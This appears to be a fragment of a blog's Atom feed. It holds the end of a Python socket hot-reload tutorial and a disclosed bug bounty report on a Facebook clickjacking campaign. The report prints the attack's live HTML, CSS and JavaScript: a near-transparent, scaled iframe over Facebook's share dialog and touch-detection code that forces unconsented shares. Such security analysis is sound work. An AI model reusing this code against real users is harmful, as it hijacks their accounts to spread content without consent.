+        &lt;span class="n"&gt;server_socket&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;bind&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;localhost&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;8000&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
+
+    &lt;span class="n"&gt;server_socket&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;listen&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+
+    &lt;span class="c1"&gt;# if we came from a reload,&lt;/span&gt;
+    &lt;span class="c1"&gt;# serve previous before accessing main loop below&lt;/span&gt;
+    &lt;span class="c1"&gt;# (in real life, these will be delayed to asynchronous tasks or dedicated threads, instead of&lt;/span&gt;
+    &lt;span class="c1"&gt;# blocking right here - but you get the idea)&lt;/span&gt;
+    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;clients_fileno&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
+        &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;resuming clients...&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+        &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;fd&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;clients_fileno&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+            &lt;span class="n"&gt;s&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;fromfd&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;int&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;fd&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;AF_INET&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;SOCK_STREAM&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+            &lt;span class="n"&gt;client_sockets&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;append&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+            &lt;span class="n"&gt;client_processing&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+            &lt;span class="n"&gt;client_sockets&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;remove&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+
+
+    &lt;span class="c1"&gt;# &amp;quot;Accept&amp;quot; loop&lt;/span&gt;
+    &lt;span class="c1"&gt;# This is our main loop&lt;/span&gt;
+    &lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="bp"&gt;True&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+        &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;client_socket&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;client_addr&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;client_port&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;server_socket&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;accept&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
+
+        &lt;span class="c1"&gt;# This step is important&lt;/span&gt;
+        &lt;span class="c1"&gt;# We don&amp;#39;t want this client owned socket to close itself after an `exec` system call.&lt;/span&gt;
+        &lt;span class="n"&gt;fcntl&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;fcntl&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;client_socket&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;fcntl&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;F_SETFD&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;SOCK_CLOEXEC&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+        &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;new client @{}:{}&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;format&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;client_addr&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;client_port&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
+
+        &lt;span class="c1"&gt;# We trick using a global here. Also, in real life,&lt;/span&gt;
+        &lt;span class="c1"&gt;# the &amp;quot;processing&amp;quot; part have to be asynchronous, or delayed&lt;/span&gt;
+        &lt;span class="c1"&gt;# into some worker processes (or both!).&lt;/span&gt;
+        &lt;span class="c1"&gt;# &lt;/span&gt;
+        &lt;span class="c1"&gt;# Here, we handle clients sequentially and individually for the sake of&lt;/span&gt;
+        &lt;span class="c1"&gt;# clarity and understanding&lt;/span&gt;
+        &lt;span class="n"&gt;client_sockets&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;append&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;client_socket&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+        &lt;span class="n"&gt;client_processing&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;client_socket&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+        &lt;span class="n"&gt;client_sockets&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;remove&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;client_socket&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+        &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;client {client_addr}:{client_port} disconnected&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+
+
+&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;main&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
+    &lt;span class="sd"&gt;&amp;#39;&amp;#39;&amp;#39;&lt;/span&gt;
+&lt;span class="sd"&gt;    &amp;#39;&amp;#39;&amp;#39;&lt;/span&gt;
+    &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;[*] Running&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s1"&gt;[*] host: localhost, port: 8000,  pid: {os.getpid()}&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+    &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;executes `kill -s SIGUSR1 {os.getpid()}` in a shell to trigger a &amp;quot;live-reload&amp;quot;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+    &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;executes `nc localhost 8000` to establish a connection&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+    &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;The server waits for the input &amp;quot;hello&amp;quot;, then answers and closes the connection.&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+
+    &lt;span class="n"&gt;p&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;argparse&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ArgumentParser&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;prog&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Fork+exec python example&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+    &lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;add_argument&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;filedescriptors&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;nargs&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;*&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+    &lt;span class="n"&gt;args&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;parse_args&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
+
+    &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;args&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+    &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;sys&lt;/span&gt;
+    &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;args&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;filedescriptors&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
+        &lt;span class="c1"&gt;# hot reload case&lt;/span&gt;
+        &lt;span class="n"&gt;start&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;args&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;filedescriptors&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="n"&gt;args&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;filedescriptors&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;:])&lt;/span&gt;
+    &lt;span class="k"&gt;else&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+        &lt;span class="n"&gt;start&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;None&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;[])&lt;/span&gt;
+
+
+&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="vm"&gt;__name__&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;__main__&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+    &lt;span class="n"&gt;main&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h1&gt;More ressources on the subject:&lt;/h1&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href="https://uwsgi-docs.readthedocs.io/en/latest/articles/TheArtOfGracefulReloading.html"&gt;uWSGI - The art of Graceful Reloading&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://www.gamlor.info/wordpress/2016/08/code-reloading-in-clojure/"&gt;Hot reloading in Clojure code&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://www.gnu.org/software/libc/manual/html_node/Descriptor-Flags.html"&gt;File Descriptor Flags (FD_CLOEXEC used as fcntl argument)&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/Fork%E2%80%93exec"&gt;Forkexec on wikipedia&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="http://man7.org/linux/man-pages/man2/socket.2.html"&gt;socket - GNU MAN&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://docs.python.org/3/library/socket.html#socket.fromfd"&gt;Python's documentation about &lt;code&gt;socket.fromfd&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;</content><category term="Linux"></category><category term="Fork"></category><category term="Exec"></category><category term="Socket"></category></entry><entry><title>Clickjacking case on facebook</title><link href="http://blog.devsda.fr/fb-clickjack.html" rel="alternate"></link><published>2019-01-04T22:20:00+01:00</published><updated>2019-01-04T22:20:00+01:00</updated><author><name>devsda</name></author><id>tag:blog.devsda.fr,2019-01-04:/fb-clickjack.html</id><summary type="html">&lt;p&gt;My bug bounty report - with some context&lt;/p&gt;</summary><content type="html">&lt;p&gt;Three weeks ago, I ran across some strange publications on facebook, originating from various friends.&lt;/p&gt;
+&lt;p&gt;&lt;img alt="publication" src="http://blog.devsda.fr/images/fb_susp_pub.jpg"&gt;&lt;/p&gt;
+&lt;p&gt;Looking at the domain - s3.amazonaws.com - and the spreading all around my facebook friends - &lt;em&gt;I decided to dig - furthermore.&lt;/em&gt;&lt;/p&gt;
+&lt;h1&gt;TL;DR&lt;/h1&gt;
+&lt;p&gt;&lt;em&gt;Facebook's share abuse:&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;A combination of dirty tricks, like CSS opacity and iframe inception, allowed to force an arbitrary user to share some content with its own facebook account - to anyone visiting a website controlled by the attacker.&lt;/p&gt;
+&lt;p&gt;Since the malicious action was to "share" the malicious website, the thing quickly started to spread.&lt;/p&gt;
+&lt;h1&gt;Report&lt;/h1&gt;
+&lt;p&gt;Here's the full report I've made after a good hour of digging. Since the issue has been patched it's no more confidential, I can disclose it right below:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;               ━━━━━━━━━━━━━━━━━━━━━━━━
+                CLICKJACKING CASE: &amp;quot;SHARE WITH FACEBOOK&amp;quot;
+               ━━━━━━━━━━━━━━━━━━━━━━━━
+
+
+Table of Contents
+─────────────────
+
+1 Security Report
+.. 1.1 Description:
+.. 1.2 Reproducing:
+2 Files analysis
+.. 2.1 files included from &amp;quot;index&amp;quot;
+.. 2.2 less important files or unexplored
+..... 2.2.1 hxxps//s3.amazonaws.com/k57c18j5fvrp1d6xuhpxq07ws/QkvX5KS9SMBEre.html
+..... 2.2.2 hxxps://s3.amazonaws.com/dziadostwoooo/popup/scripts/js.cookie.js
+..... 2.2.3 hxxps://s3.amazonaws.com/dziadostwoooo/popup/scripts/main.js
+
+
+
+
+
+1 Security Report
+═════════════════
+
+1.1 Description:
+────────────────
+
+  While browsing my newsfeed, I noticed a few publications, originating
+  from &amp;#39;s3.amazonaws*&amp;#39; domains.  I decided to take a look, because these
+  publications differs from content usually shared by these people.
+
+  I copied the publication link using &amp;quot;right click&amp;quot; -&amp;gt; &amp;quot;copy link
+  address&amp;quot;, and started digging with `curl` and `wget`. After noticing
+  some very weird looking domains (high entropy, like
+  `s3.amazonaws.com/k57c18j5fvrp1d6xuhpxq07ws/QkvX5KS9SMBEre.html`), and
+  typical clickjacking tricks (css&amp;#39; opacity, iframes), I jumped into the
+  javascript code.
+
+
+  What I&amp;#39;ve found looked nasty, so I attempted using a test account. And
+  It worked - my test account shared a publication without my consent -
+  nothing indicating that I&amp;#39;m actually sharing something to my facebook
+  friends.  This is why I&amp;#39;m filling this security report.
+
+  Actually, the code is not even minimified and quite easy to
+  read. Sadly, I don&amp;#39;t have enough time right know to provide the &amp;quot;full
+  exploit&amp;quot; step by step… but I&amp;#39;ve dumped all the involved code.
+
+  Attached, you&amp;#39;ll find an archive containing:
+  • the frontend code (HTML/Javascript/CSS) involved in this
+    clickjacking setup (directory &amp;#39;statics&amp;#39;)
+  • notes I took during the investigation (notes.txt, with its original
+    org-mode file). In this short memo, I&amp;#39;ve isolated suspicious-looking
+    lines of code, and attempted to describe what&amp;#39;s going on. Because of
+    the multiples domains and file inclusions, it&amp;#39;s not easy to follow
+    without writing things down.
+  • original publication screenshot (publication_screenshot.jpg) in my
+    newsfeed.
+
+
+1.2 Reproducing:
+────────────────
+
+  1. go to
+     hxxps://s3.amazonaws.com/k57c18j5fvrp1d6xuhpxq07ws/zPIXitiQPOp6W3.html?vsQj2bGUkS83hkK&amp;amp;fbclid=IwAR0wu0OuGgjb1OhLDl9ghJhoY_leDXVhIPQ_kQU3-aDyOMdfwXZWZS7UN74
+     from an android smartphone (successfully tested with chrome on
+     android, Samsung Galaxy S6)
+  2. A popup asks you (in french) if you are more than 16 year old
+  3. Whatever you &amp;quot;touch/click&amp;quot; on your screen, it will trigger a
+     &amp;quot;share&amp;quot; from any logged-in account. And the cycle continues
+
+  Compatibles victims are checked with the following javascript
+  condition: &amp;quot;(bowser.mobile || bowser.tablet) &amp;amp;&amp;amp; (bowser.android ||
+  bowser.chrome || bowser.msie || bowser.msedge)&amp;quot;
+  (statics/s3.amazonaws.com/k57c18j5fvrp1d6xuhpxq07ws/QkvX5KS9SMBE.js
+  within the archive)
+
+
+2 Files analysis
+════════════════
+
+2.1 files included from &amp;quot;index&amp;quot;
+───────────────────────────────
+
+  /Code is copy/pasted without reformatting/
+
+
+  links have been replaced to avoid misclicks (http-&amp;gt;hxxp)
+
+  Entry point (from facebook) is
+  hxxps://s3.amazonaws.com/k57c18j5fvrp1d6xuhpxq07ws/zPIXitiQPOp6W3.html?vsQj2bGUkS83hkK&amp;amp;fbclid=IwAR0wu0OuGgjb1OhLDl9ghJhoY_leDXVhIPQ_kQU3-aDyOMdfwXZWZS7UN74
+  Copied from &amp;quot;right click&amp;quot; -&amp;gt; &amp;quot;copy link address&amp;quot; on some suspicious
+  publication from a friend of mine in facebook.
+
+
+
+  Within the &amp;quot;index&amp;quot;, these lines are interesting:
+
+  ┌────
+  │ 
+  │ &amp;lt;h4&amp;gt;Pour accéder à ce site, vous devez être âgé de 16 ans ou plus.&amp;lt;/h4&amp;gt;
+  │ &amp;lt;h4&amp;gt;Avez-vous plus de 16 ans?&amp;lt;/h4&amp;gt;
+  │ 
+  │         &amp;lt;button type=&amp;quot;submit&amp;quot; name=&amp;quot;submit&amp;quot; class=&amp;quot;btn btn-newsletter&amp;quot; onclick=&amp;quot;top.location.href = &amp;#39;hxxps://s3.amazonaws.com/k57c18j5fvrp1d6xuhpxq07ws/QkvX5KS9SMBEre.html&amp;#39;&amp;quot;&amp;gt;Oui.&amp;lt;/button&amp;gt;
+  │         &amp;lt;iframe class=&amp;quot;d8485i63ikjasdiu73h&amp;quot; id=&amp;quot;d8485i63ikjasdiu73h&amp;quot;  onload=&amp;quot;&amp;quot; scrolling=&amp;quot;no&amp;quot; src=&amp;quot;hxxps://pejzbugpedau.s3.amazonaws.com/iframe.html&amp;quot;&amp;gt;&amp;lt;/iframe&amp;gt;
+  │ 
+  └────
+
+  it also fetchs statics as custom JS and CSS from various aws opaque
+  domains
+
+  A CSS rule applies to /class=&amp;quot;d8485i63ikjasdiu73h&amp;quot;
+  id=&amp;quot;d8485i63ikjasdiu73h&amp;quot;/, located under
+  hxxtp://s3.amazonaws.com/dziadostwoooo/popup/styles/main.css.
+
+
+  ┌────
+  │ .d8485i63ikjasdiu73h {
+  │         width: 100%;
+  │         max-width: 400px;
+  │         border: none;
+  │         opacity: 0.03;
+  │         -webkit-transform: scaleX(200) scaleY(200);
+  │         transform: scaleX(200) scaleY(200);
+  │         margin-top: 8500px;
+  │ }
+  └────
+
+  /hxxps://s3.amazonaws.com/k57c18j5fvrp1d6xuhpxq07ws/QkvX5KS9SMBE.js/
+  also interacts with this element (l.97):
+
+  ┌────
+  │ 
+  │ // Autoshow popup after x seconds
+  │ if (!Cookies.get(&amp;#39;popup-shown&amp;#39;)) {
+  │ 
+  │         // Show 1st time - autoshow
+  │         window.setTimeout(function () {
+  │                 if ((bowser.mobile || bowser.tablet) &amp;amp;&amp;amp; (bowser.android || bowser.chrome || bowser.msie || bowser.msedge)) {
+  │                         gtag(&amp;#39;event&amp;#39;, &amp;#39;wyświetlenie&amp;#39;, {
+  │                                 &amp;#39;event_category&amp;#39; : &amp;#39;viral&amp;#39;,
+  │                                 &amp;#39;event_label&amp;#39; : &amp;#39;&amp;#39;
+  │                         });
+  │ 
+  │                         var myConfObj = {
+  │                                 iframeMouseOver : false
+  │                         }
+  │                         window.addEventListener(&amp;#39;blur&amp;#39;,function(){
+  │                           if(myConfObj.iframeMouseOver){
+  │                                 gtag(&amp;#39;event&amp;#39;, &amp;#39;kliknięcie&amp;#39;, {
+  │                                         &amp;#39;event_category&amp;#39; : &amp;#39;viral&amp;#39;,
+  │                                         &amp;#39;event_label&amp;#39; : &amp;#39;&amp;#39;
+  │                                 });
+  │                                 top.location.href = &amp;#39;hxxps://s3.amazonaws.com/k57c18j5fvrp1d6xuhpxq07ws/QkvX5KS9SMBEre.html&amp;#39;;
+  │ 
+  │                           }
+  │                         });
+  │ 
+  │                         document.getElementById(&amp;#39;d8485i63ikjasdiu73h&amp;#39;).addEventListener(&amp;#39;touchstart&amp;#39;,function(){
+  │                            myConfObj.iframeMouseOver = true;
+  │                         });
+  │                         document.getElementById(&amp;#39;d8485i63ikjasdiu73h&amp;#39;).addEventListener(&amp;#39;mouseover&amp;#39;,function(){
+  │                            myConfObj.iframeMouseOver = true;
+  │                         });
+  │                         document.getElementById(&amp;#39;d8485i63ikjasdiu73h&amp;#39;).addEventListener(&amp;#39;touchend&amp;#39;,function(){
+  │                                 myConfObj.iframeMouseOver = false;
+  │                         });
+  │                         document.getElementById(&amp;#39;d8485i63ikjasdiu73h&amp;#39;).addEventListener(&amp;#39;mouseout&amp;#39;,function(){
+  │                                 myConfObj.iframeMouseOver = false;
+  │                         });
+  │ 
+  │                 } else{
+  │                         (document.getElementById(&amp;quot;d8485i63ikjasdiu73h&amp;quot;)).remove();
+  │                 }
+  │                 show();
+  │         }, 2000);
+  │ 
+  │         // Show 2nd time - on exit
+  │         $(document).on(&amp;#39;mousemove&amp;#39;, function (e) {
+  │                 if (e.pageY - $(document).scrollTop() &amp;lt;= 20 &amp;amp;&amp;amp; previousY &amp;gt; e.pageY &amp;amp;&amp;amp; !isExitPopupShown) {
+  │                         show();
+  │                         isExitPopupShown = true;
+  │                 }
+  │ 
+  │                 previousY = e.pageY;
+  │         });
+  │ }
+  │ 
+  └────
+
+
+  Here&amp;#39;s the content of our iframe, fetch from
+  /hxxps://pejzbugpedau.s3.amazonaws.com/iframe.html/
+
+  ┌────
+  │ &amp;lt;style&amp;gt;
+  │                 .cookie_frame {
+  │                                                 width: 100%;
+  │                                                 border: none;
+  │                                                 }
+  │                 &amp;lt;/style&amp;gt;
+  │                 &amp;lt;iframe class=&amp;quot;cookie_frame&amp;quot; id=&amp;quot;cookie_frame&amp;quot; onload=&amp;quot;&amp;quot; scrolling=&amp;quot;no&amp;quot; src=&amp;quot;hxxps://pejzbugpedau.s3.amazonaws.com/UE8jnrzxB1JIQ7c0TYHmZN9l.html&amp;quot;&amp;gt;&amp;lt;/iframe&amp;gt;
+  └────
+
+
+  oh, this creates a new /iframe/ witch content fetched from
+  /hxxps://pejzbugpedau.s3.amazonaws.com/UE8jnrzxB1JIQ7c0TYHmZN9l.html/.
+
+  /It looks like this code actually share the viral content, in a pretty
+  strange way, into an iframe within an iframe which opacity is 0.03/ 🤔
+
+  ┌────
+  │ &amp;lt;html&amp;gt;&amp;lt;body&amp;gt;&amp;lt;iframe style=&amp;quot;margin-top: -300;width: 100%;height: 340px;&amp;quot; id=&amp;quot;tenframe&amp;quot; src=&amp;quot;hxxps://mobile.facebook.com/v2.6/dialog/share?app_id=350685531728&amp;amp;href=hxxps://s3.amazonaws.com/k57c18j5fvrp1d6xuhpxq07ws/WZSGtHRmVIqvD.html?PUprfLl5CV
+  │ &amp;amp;in_iframe=1&amp;amp;locale=en_US&amp;amp;mobile_iframe=1&amp;quot; scrolling=&amp;quot;no&amp;quot;&amp;gt;&amp;lt;/iframe&amp;gt;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;
+  └────
+
+
+  I&amp;#39;m not sure these are malicious, but wow, this is the most
+  complicated way of doing a facebook share I&amp;#39;ve seen in my life.
+
+  Edit: This is definitely some Clickjacking, reproduced
+
+
+2.2 less important files or unexplored
+──────────────────────────────────────
+
+2.2.1 hxxps//s3.amazonaws.com/k57c18j5fvrp1d6xuhpxq07ws/QkvX5KS9SMBEre.html
+╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌
+
+  ┌────
+  │ &amp;lt;script&amp;gt;
+  │ top.location.href = &amp;quot;http://bit.ly/2L3Chw0&amp;quot;;
+  │ &amp;lt;/script&amp;gt;
+  └────
+
+  • leads to [http://bit.ly/2L3Chw0]
+  • that leads to highfives.space/ (wordpress behind cloudflare)
+    (highfives.space/post/a-quoi-ressemble-la-vie-avant-et-apres-vos-30-ans/)
+
+  which himself includes a lot of stuff.
+
+
+2.2.2 hxxps://s3.amazonaws.com/dziadostwoooo/popup/scripts/js.cookie.js
+╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌
+
+  Looks like a generic cookie javascript library
+
+
+2.2.3 hxxps://s3.amazonaws.com/dziadostwoooo/popup/scripts/main.js
+╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌
+
+  ┌────
+  │ $(function () {
+  │ 
+  │         // Initialize Popup
+  │         Popup.init({
+  │                 popupOverlayEl: $(&amp;#39;.popup-overlay&amp;#39;),
+  │                 popupEl: $(&amp;#39;.popup&amp;#39;),
+  │                 closeEl: $(&amp;#39;.popup&amp;#39;).find(&amp;#39;.close&amp;#39;),
+  │                 errorMsgEl: $(&amp;#39;.popup&amp;#39;).find(&amp;#39;.validation-errors&amp;#39;)
+  │         });
+  │ });
+  └────
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Like I said, I've dumped each piece of HTML/JS/CSS involved in this "attack", email me at &lt;code&gt;slashdevsda⦦  ⦦gmail⦦dot⦦com&lt;/code&gt; if you are interested. &lt;/p&gt;
+&lt;p&gt;During the process, I discovered &lt;code&gt;wget -np -lp -r &amp;lt;url&amp;gt;&lt;/code&gt;. 
+This command is awesome for these purposes - copying a whole website locally, by following links. In a manner of minutes, you could copy an entire platform for local analysis.
+Each argument (&lt;code&gt;-r&lt;/code&gt;, &lt;code&gt;-lp&lt;/code&gt;, &lt;code&gt;-np&lt;/code&gt;) is explained within &lt;code&gt;man wget&lt;/code&gt;.&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;I won't receive any reward, but that's not an issue. I just wanted to have fun - &lt;em&gt;I did.&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;The guy from facebook's security told me that the "issue has already been reported" - this is what I've hoped for, because the flaw was already massively exploited. Still wondering how this could happen, since Facebook is very opaque about its own security.&lt;/p&gt;
